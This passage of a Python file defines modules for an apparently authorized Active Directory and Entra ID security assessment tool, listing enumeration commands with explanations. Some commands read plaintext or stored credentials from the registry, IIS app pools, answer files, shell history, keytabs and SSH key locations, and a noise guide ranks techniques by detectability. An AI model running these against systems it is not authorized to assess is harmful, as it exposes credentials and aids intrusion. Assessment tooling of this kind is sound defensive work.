                    ("Check PointAndPrint policy", "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint' /v NoWarningNoElevationOnInstall", "1 = PointAndPrint installs without elevation warning — PrintNightmare path."),
                    ("Check PrintNightmare patch", "Get-HotFix -Id KB5004945,KB5004946,KB5004947,KB5004948,KB5004960 | Select-Object HotFixID,InstalledOn", "July 2021 patches for CVE-2021-1675/34527."),
                ],
            },
            {
                "id": "cve-nopac-certifried",
                "name": "noPac, Certifried, and CVE-2025-24071",
                "description": "Machine account name spoofing and archive hash-leak posture.",
                "commands": [
                    ("Check MachineAccountQuota (noPac prereq)", "Get-ADDomain | Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota'", "MAQ > 0 + unpatched noPac = DA in a single step."),
                    ("Check noPac patch state", "Get-HotFix -Id KB5008102,KB5008380 | Select-Object HotFixID,InstalledOn", "November 2021 patches for CVE-2021-42278/42287."),
                    ("Check Certifried patch (CVE-2022-26923)", "Get-HotFix -Id KB5014754,KB5014745 | Select-Object HotFixID,InstalledOn", "May 2022 patches for CA-issued machine-account certificate spoofing."),
                    ("Check outbound SMB filtering (CVE-2025-24071)", "netsh advfirewall firewall show rule name=all | findstr -i '445.*block'", "CVE-2025-24071 leaks NTLM via archive handling — outbound SMB block mitigates."),
                    ("Check .library-ms association handling", "assoc .library-ms", "Tracks file-type association exploited by CVE-2025-24071."),
                ],
            },
        ],
        ["live exploit execution", "production system exploitation"],
    ),

    _module(
        "hybrid_entra_architecture",
        "Hybrid Entra and Azure AD Paths",
        "hybrid",
        "Azure AD Connect, PHS/PTA/ADFS, PRT/token theft, cloud-to-on-prem paths, on-prem-to-cloud pivots, cross-tenant ROPC, SPA tokens, and Entra metaverse attacks.",
        [
            {
                "id": "entra-aadc",
                "name": "Azure AD Connect enumeration",
                "description": "Identify AAD Connect server, sync account, and mode.",
                "commands": [
                    ("Find MSOL sync account (AD)", "Get-ADUser -Filter {SamAccountName -like 'MSOL_*'} -Properties Description,PasswordNeverExpires,Enabled,PasswordLastSet", "MSOL_ account has DCSync-equivalent rights — high-value target."),
                    ("Identify AAD Connect server (AD SCP)", "Get-ADObject -Filter {objectClass -eq 'serviceConnectionPoint'} -SearchBase 'CN=Microsoft Azure AD Connect,CN=Services,CN=Configuration,DC=corp,DC=com' -Properties serviceBindingInformation", "Service connection point reveals AAD Connect server and tenant."),
                    ("Check sync mode (local, authorized)", "Import-Module ADSync; Get-ADSyncGlobalSettings | Select-Object SyncAccountName", "Reveals PHS/PTA/ADFS sync mode and service account — run on AAD Connect server."),
                    ("Find Seamless SSO account", "Get-ADComputer -Filter {Name -eq 'AZUREADSSOACC'} -Properties PasswordLastSet,Description", "AZUREADSSOACC uses a static Kerberos key — stale = Kerberos golden ticket risk."),
                ],
            },
            {
                "id": "entra-roadtools",
                "name": "ROADtools and AADInternals posture",
                "description": "Authorized Entra ID tenant and identity posture review.",
                "commands": [
                    ("Get tenant info (unauthenticated)", "curl -s 'https://login.microsoftonline.com/<domain>/.well-known/openid-configuration' | python3 -m json.tool | grep issuer", "Returns tenant ID from OIDC discovery — no credentials needed."),
                    ("ROADtools — device-code auth", "roadrecon auth --device-code", "Authorized token acquisition via device-code flow."),
                    ("ROADtools — gather all objects", "roadrecon gather --tokens .roadtools_auth --all", "Collects users, groups, apps, service principals, role assignments."),
                    ("ROADtools — export to SQLite", "roadrecon gather --tokens .roadtools_auth -o roadrecon.db", "Stores Entra objects in SQLite for offline analysis."),
                    ("AADInternals — get tenant domains", "Import-Module AADInternals; Get-AADIntLoginInformation -Domain <domain> | Select-Object DomainName,FederationBrandName,NameSpaceType", "Returns federation type (Managed/Federated) without credentials."),
                    ("AADInternals — list privileged roles", "Import-Module AADInternals; Get-AADIntAzureADRoleMembers -RoleName 'Global Administrator' -AccessToken $token", "Authorized review of Entra privileged role members."),
                ],
            },
        ],
        ["token theft from production users", "cloud tenant abuse", "unauthorized cloud enumeration"],
    ),

    _module(
        "local_privesc_architecture",
        "Local Privilege Escalation Architecture",
        "host-access",
        "Potato/token impersonation, service misconfigurations, unquoted paths, AlwaysInstallElevated, local credential artifacts, kernel paths, SeBackup/SeRestore/SeLoadDriver/SeDebug, and LAPS-readable hosts.",
        [
            {
                "id": "lprivesc-tokens",
                "name": "Token privilege review",
                "description": "Identify exploitable token privileges on the current session.",
                "commands": [
                    ("List current privileges", "whoami /priv", "SeImpersonate, SeAssignPrimaryToken, SeBackup, SeRestore, SeLoadDriver, SeDebug — all exploitable."),
                    ("Check for impersonation tokens", "Get-Process | Where-Object {$_.SessionId -gt 0} | Select-Object Id,Name,SessionId", "Active user sessions with tokens for impersonation."),
                    ("Check service account tokens", "Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -notmatch 'LocalSystem|LocalService|NetworkService'} | Select-Object Name,StartName,State", "Services running as domain accounts — token impersonation targets."),
                ],
            },
            {
                "id": "lprivesc-services",
                "name": "Service and path misconfigurations",
                "description": "Unquoted paths, weak service ACLs, and writable directories.",
                "commands": [
                    ("Find unquoted service paths", "Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '\"' -and $_.PathName -notmatch 'System32'} | Select-Object Name,PathName,StartMode,StartName", "Space in path without quotes = binary planting opportunity."),
                    ("Check service binary ACLs (sc)", "sc qc <ServiceName>", "Review binary path for weak ACLs."),
                    ("PowerUp — all local privesc checks", "Invoke-AllChecks | Format-List", "Comprehensive local privesc check via PowerUp — authorized host only."),
                    ("Check AlwaysInstallElevated", "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "Both must be 1 for MSI elevation abuse."),
                    ("Find writable service directories", "Get-WmiObject -Class Win32_Service | ForEach-Object { $path = ($_.PathName -split ' ')[0] -replace '\"',''; $dir = Split-Path $path; try { [System.IO.File]::OpenWrite($path) | Close } catch {}; icacls $dir 2>$null } | findstr 'Everyone\\|BUILTIN\\Users'", "Writable service binary directory = binary replacement privilege escalation."),
                ],
            },
            {
                "id": "lprivesc-creds",
                "name": "Local credential artifact inventory",
                "description": "Credential exposure on local hosts without active dumping.",
                "commands": [
                    ("PowerShell history file", "Get-Content (Get-PSReadlineOption).HistorySavePath 2>/dev/null", "Command history often contains credentials passed as arguments."),
                    ("Check autologon credentials", "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' /v DefaultPassword", "Plaintext credential in registry if autologon configured."),
                    ("Find unattend.xml files", "Get-ChildItem -Path C:\\ -Recurse -Include unattend.xml,Unattended.xml,sysprep.xml -ErrorAction SilentlyContinue | Select-Object FullName", "Sysprep answer files contain base64-encoded local admin passwords."),
                    ("Web.config credential search", "Get-ChildItem -Path C:\\inetpub,C:\\www -Recurse -Include web.config -ErrorAction SilentlyContinue | Select-String -Pattern 'password|connectionString'", "IIS web.config often stores DB and service credentials."),
                    ("Check IIS application pool passwords", "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /processModel.userName:?* /text:processModel.password", "App pool identities with hardcoded credentials."),
                ],
            },
        ],
        ["local exploit execution", "driver-based privilege escalation"],
        ["WINDOWS_LOCAL", "WINDOWS_REMOTE", "IMPORT"],
    ),

    _module(
        "linux_ad_architecture",
        "Linux AD Artifact Architecture",
        "host-access",
        "Kerberos ccache/keytabs, SSSD and Winbind secrets, Impacket auth from Linux, ticket conversion, SSH keys, containers, cron, config management, and shell history on AD-joined Linux hosts.",
        [
            {
                "id": "linux-kerberos",
                "name": "Kerberos cache and keytab review",
                "description": "Discover Kerberos material on Linux AD-joined hosts.",
                "commands": [
                    ("List active Kerberos tickets", "klist", "Current ccache ticket inventory."),
                    ("Find all ccache files in /tmp", "find /tmp /run /var/tmp -maxdepth 2 -name 'krb5cc_*' 2>/dev/null", "Per-user Kerberos ticket caches."),
                    ("Find keytab files", "find / -name '*.keytab' -o -name 'krb5.keytab' 2>/dev/null | head -20", "Keytabs enable long-term Kerberos auth — high value."),
                    ("Read keytab principal list (authorized)", "klist -k /etc/krb5.keytab", "Lists principals and encryption types in the keytab."),
                    ("Check SSSD ticket cache location", "grep -i 'ccache_storage\\|krb5_store_password\\|id_provider' /etc/sssd/sssd.conf 2>/dev/null", "SSSD ccache location and Kerberos configuration."),
                ],
            },
            {
                "id": "linux-pivot-paths",
                "name": "Linux pivot and lateral movement surfaces",
                "description": "SSH keys, container escape paths, and config management credential stores.",
                "commands": [
                    ("Find SSH private keys", "find /root /home -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null", "SSH private keys for lateral movement."),
                    ("Find authorized_keys files", "find /root /home -name 'authorized_keys' 2>/dev/null", "Lists hosts that trust this key — maps lateral paths."),
                    ("Check shell history for credentials", "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'password|passwd|secret|token|key' | head -30", "Command history credential exposure."),
                    ("Check Ansible vault files", "find / -name '*.vault' -o -name 'vault_pass*' 2>/dev/null | head -10", "Ansible vault files contain encrypted secrets — crack target."),
                    ("Check Docker/Podman socket access", "ls -la /var/run/docker.sock /run/podman/podman.sock 2>/dev/null", "Writable container socket = container escape to host."),
                    ("Find cron credential leaks", "cat /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null | grep -iE 'password|secret|token'", "Cron scripts with embedded credentials."),
                    ("Check Winbind secrets", "ls -la /var/lib/samba/private/secrets.tdb /var/lib/samba/private/schannel_store.tdb 2>/dev/null", "Winbind stores machine and service account credentials."),
                ],
            },
        ],
        ["ticket theft from other users", "container escape exploitation"],
        ["LINUX_REMOTE", "IMPORT"],
    ),

    _module(
        "defense_opsec_architecture",
        "Defensive Controls and OPSEC",
        "policy",
        "Protected Users, Credential Guard, AES-only Kerberos, LDAP/SMB signing, EPA, tiered administration, audit events, noise guide, LDAP OPSEC, and preferred low-noise alternatives.",
        [
            {
                "id": "defense-controls",
                "name": "Defensive control posture checks",
                "description": "Enumerate defensive mitigations across identity and network layers.",
                "commands": [
                    ("Protected Users group membership", "Get-ADGroupMember 'Protected Users' | Select-Object SamAccountName,ObjectClass,DistinguishedName", "Members get: AES-only, no NTLM, no delegation, no caching."),
                    ("Credential Guard state", "Get-CimInstance -ClassName Win32_DeviceGuard | Select-Object SecurityServicesRunning,VirtualizationBasedSecurityStatus,RequiredSecurityProperties", "LSAIso (2) = VBS Credential Guard active."),
                    ("Check AES-only Kerberos enforcement", "Get-ADDefaultDomainPasswordPolicy | Select-Object ComplexityEnabled,MinPasswordLength", "Supplement with msDS-SupportedEncryptionTypes=24 check on key accounts."),
                    ("SMB signing required (DC)", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v RequireSecuritySignature", "1 = signing required on this host; 0 = relay-vulnerable."),
                    ("LDAP signing required", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LDAPServerIntegrity", "2 = required; 1 = negotiated; 0 = unsigned allowed."),
                    ("LDAP channel binding", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LdapEnforceChannelBinding", "2 = always enforced."),
                    ("Defender / AV state", "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AMRunningMode", "Endpoint protection posture."),
                ],
            },
            {
                "id": "opsec-noise-guide",
                "name": "Technique noise reference",
                "description": "Assessment technique noise classification for detection-aware planning.",
                "commands": [
                    ("Low-noise techniques", "Targeted LDAP queries; BloodHound DCOnly; passive DNS; passive OSINT", "Minimal telemetry — preferred for initial collection."),
                    ("Medium-noise techniques", "BloodHound Session collection; DCSync; relay with signing gaps; Coercer; Kerberoast", "Generates detectable artifacts — time window matters."),
                    ("High-noise techniques", "PsExec; mass LSASS dumping; active LLMNR/NBT-NS poisoning; unconstrained delegation coercion sweep", "Likely to trigger SIEM/EDR — explicit change-window required."),
                    ("Check audit event coverage", "auditpol /get /category:*", "Review which events are audited before triggering techniques."),
                    ("Check Windows Event Forwarding", "Get-ChildItem HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\EventForwarding 2>$null", "WEF active = logs forwarded to SIEM — relevant for OPSEC planning."),
                ],
            },
        ],
        ["defense evasion implementation", "EDR bypass techniques"],
    ),

    _module(
        "misconfiguration_checklist_architecture",
        "Common Misconfiguration Checklist",
        "policy",
        "Checklist coverage for Kerberos, NTLM, AD CS, ACLs, credential hygiene, network services, SCCM, ADIDNS, WSUS, Exchange, and management-plane exposure.",
        [
            {
                "id": "misc-kerberos-ntlm",
                "name": "Kerberos and NTLM hygiene checklist",
                "description": "High-frequency engagement findings around Kerberos and NTLM configuration.",
                "commands": [
                    ("Check pre-auth disabled (AS-REP)", "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} | Select-Object SamAccountName", "Any enabled users = AS-REP roastable."),
                    ("Check RC4 encryption type (Kerberoast)", "Get-ADObject -LDAPFilter '(|(userAccountControl:1.2.840.113556.1.4.803:=4194304)(servicePrincipalName=*))' -Properties msDS-SupportedEncryptionTypes | Where-Object {$_.'msDS-SupportedEncryptionTypes' -band 4} | Select-Object SamAccountName", "RC4 (flag 4) = easy-crack Kerberoast target."),
                    ("Check NTLM v1 compatibility", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LmCompatibilityLevel", "< 5 = NTLMv1 allowed — downgrade and relay risk."),
                    ("Check NTLMv1 in group policy", "Get-GPOReport -All -ReportType Xml | Select-String -Pattern 'LmCompatibilityLevel'", "GPO-enforced NTLM level override."),
                ],
            },
            {
                "id": "misc-adcs-acl",
                "name": "AD CS and ACL checklist",
                "description": "Certificate service and ACL misconfigurations.",
                "commands": [
                    ("Certipy — full ADCS scan (authorized)", "certipy find -u <user>@<domain> -p <pass> -dc-ip <IP> -vulnerable -stdout", "Identifies ESC1-ESC16, template misconfigs, and CA relay paths."),
                    ("Check MachineAccountQuota", "Get-ADDomain | Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota'", "MAQ > 0 enables RBCD/noPac chains for unprivileged users."),
                    ("Check AdminSDHolder non-default ACEs", "(Get-Acl 'AD:\\CN=AdminSDHolder,CN=System,DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|Administrators|SYSTEM|CREATOR OWNER'} | Select-Object IdentityReference,ActiveDirectoryRights", "Propagates to all protected objects every 60 min."),
                    ("Check domain root DCSync ACEs", "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object { $_.ObjectType -in @('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ab-9c07-11d1-f79f-00c04fc2dcd2') } | Select-Object IdentityReference,ActiveDirectoryRights", "Non-DA accounts with replication rights = DCSync."),
                ],
            },
            {
                "id": "misc-network-mgmt",
                "name": "Network and management-plane checklist",
                "description": "Relay, coercion, and enterprise-management exposure.",
                "commands": [
                    ("Check LLMNR policy", "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient /v EnableMulticast", "0 = LLMNR disabled; missing or 1 = poisoning risk."),
                    ("Check NBT-NS", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters /v NodeType", "2 or 8 = point-to-point/hybrid; 1 or 4 = B-node = NBT-NS enabled."),
                    ("Check WebClient running", "Get-Service WebClient | Select-Object Status", "Running = WebDAV coercion path enabled."),
                    ("Check WSUS transport (HTTP)", "reg query 'HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate' /v WUServer", "HTTP WSUS URL = MITM update injection risk."),
                    ("Check Exchange Windows Permissions membership", "Get-ADGroupMember 'Exchange Windows Permissions' | Select-Object SamAccountName,ObjectClass", "Members have WriteDACL on domain root = DCSync path."),
                ],
            },
        ],
    ),

    _module(
        "wsus_exchange_architecture",
        "WSUS and Exchange Architecture",
        "enterprise-management",
        "WSUS command push/MITM posture, WSUSpendu, SharpWSUS, Exchange permission abuse, PrivExchange, ProxyLogon/ProxyShell/ProxyNotShell, mailbox search, GAL extraction, transport rules, and OWA credential-harvesting references.",
        [
            {
                "id": "wsus-posture",
                "name": "WSUS posture checks",
                "description": "WSUS server discovery and transport security review.",
                "commands": [
                    ("Find WSUS server URL (registry)", "reg query 'HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate' /v WUServer", "HTTP WSUS URL = plaintext update traffic, MITM risk."),
                    ("Find WSUS server (PowerShell)", "Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate' | Select-Object WUServer,WUStatusServer", "WSUS server and status server endpoint."),
                    ("Find WSUS via AD SPN", "Get-ADObject -LDAPFilter '(servicePrincipalName=http/WSUS*)' -Properties servicePrincipalName | Select-Object Name,servicePrincipalName", "AD-registered WSUS server via SPN."),
                    ("SharpWSUS — list computers (authorized lab)", "SharpWSUS.exe list", "Lists WSUS-managed computers — authorized testing only."),
                    ("Check WSUS service transport", "nmap -Pn -p 8530,8531 -sV <IP>", "8530=HTTP, 8531=HTTPS — HTTP endpoint is vulnerable to MITM."),
                ],
            },
            {
                "id": "exchange-posture",
                "name": "Exchange exposure checks",
                "description": "Exchange permission abuse, CVE posture, and AD integration.",
                "commands": [
                    ("Check Exchange Windows Permissions ACL", "Get-ADGroupMember 'Exchange Windows Permissions' | Select-Object SamAccountName,ObjectClass,DistinguishedName", "EWP members have WriteDACL on domain root — DCSync path."),
                    ("Check Exchange Trusted Subsystem", "Get-ADGroupMember 'Exchange Trusted Subsystem' | Select-Object SamAccountName,ObjectClass", "EXCHANGE$ computer account in this group; compromise = domain control path."),
                    ("Check Exchange server version and patches", "nmap -Pn -p 443 --script http-headers <ExchangeIP> | grep 'X-OWA\\|X-EWS'", "Exchange OWA headers reveal version for CVE mapping."),
                    ("Find Exchange servers (AD)", "Get-ADObject -LDAPFilter '(objectClass=msExchExchangeServer)' -Properties cn,msExchCurrentServerRoles | Select-Object cn,msExchCurrentServerRoles", "AD-registered Exchange servers."),
                    ("Check PrivExchange ACL (WriteProperty on domain)", "(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -match 'Exchange'} | Select-Object IdentityReference,ActiveDirectoryRights", "PrivExchange writes DACL on domain object to grant relay target DCSync."),
                ],
            },
        ],
        ["malicious update approval", "mailbox exfiltration", "Exchange exploitation"],
    ),

    _module(
        "evasion_reference_architecture",
        "AMSI CLM AppLocker and EDR Reference",
        "policy",
        "AMSI, CLM, AppLocker, WDAC, ETW, kernel callbacks, LOLBAS, BYOVD risk, and practical control-validation decision trees.",
        [
            {
                "id": "evasion-amsi-clm",
                "name": "AMSI and CLM posture",
                "description": "Verify script restriction and Defender state without triggering bypasses.",
                "commands": [
                    ("Check PowerShell language mode", "$ExecutionContext.SessionState.LanguageMode", "FullLanguage = unrestricted; ConstrainedLanguage = AppLocker/WDAC restricted."),
                    ("Check AMSI providers", "reg query 'HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers'", "Lists registered AMSI providers — missing or disabled = no script scanning."),
                    ("Check Windows Defender state", "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AMRunningMode,AMProductVersion", "AMRunningMode: Normal=active, Passive=coexistence, EDRBlock=EDR-only."),
                    ("Check ScriptBlockLogging", "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' /v EnableScriptBlockLogging", "1 = all script blocks logged to Event ID 4104."),
                    ("Check ModuleLogging", "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging' /v EnableModuleLogging", "1 = module pipeline execution logged."),
                ],
            },
            {
                "id": "evasion-applocker-wdac",
                "name": "AppLocker and WDAC policy review",
                "description": "Enumerate code integrity policies and their enforcement mode.",
                "commands": [
                    ("Get effective AppLocker policy", "Get-AppLockerPolicy -Effective | Format-List", "Shows effective rules for Exe, Script, MSI, DLL, and PackagedApp."),
                    ("Check AppLocker service state", "Get-Service AppIDSvc | Select-Object Status,StartType", "AppIDSvc must run for AppLocker enforcement."),
                    ("Check WDAC policy (Device Guard)", "Get-CimInstance -ClassName Win32_DeviceGuard | Select-Object CodeIntegrityPolicyEnforcementStatus,UsermodeCodeIntegrityPolicyEnforcementStatus", "2 = enforcement mode; 1 = audit mode; 0 = off."),
                    ("Check WDAC policy file location", "Get-ChildItem C:\\Windows\\System32\\CodeIntegrity\\CIPolicies\\Active\\ -ErrorAction SilentlyContinue | Select-Object Name,LastWriteTime", "Active WDAC policy binary files."),
                    ("List WDAC allowed paths", "Get-CIPolicyInfo | Select-Object FriendlyName,PolicyPath,IsAuthorized", "Requires CIPolicyInfo module — shows allowed path exceptions."),
                    ("Check ETW provider state", "logman query providers | findstr -i 'Microsoft-Windows-DotNETRuntime\\|Microsoft-Windows-PowerShell'", "ETW providers feeding SIEM visibility into .NET and PS runtime."),
                ],
            },
        ],
        ["AMSI bypass implementation", "EDR evasion", "BYOVD execution"],
        ["WINDOWS_LOCAL", "WINDOWS_REMOTE", "IMPORT"],
    ),
]


def merge_architecture_modules(modules: list[dict[str, Any]]) -> list[dict[str, Any]]:
    seen = {module["id"] for module in modules}
    return modules + [module for module in ARCHITECTURE_ATTACK_MODULES if module["id"] not in seen]
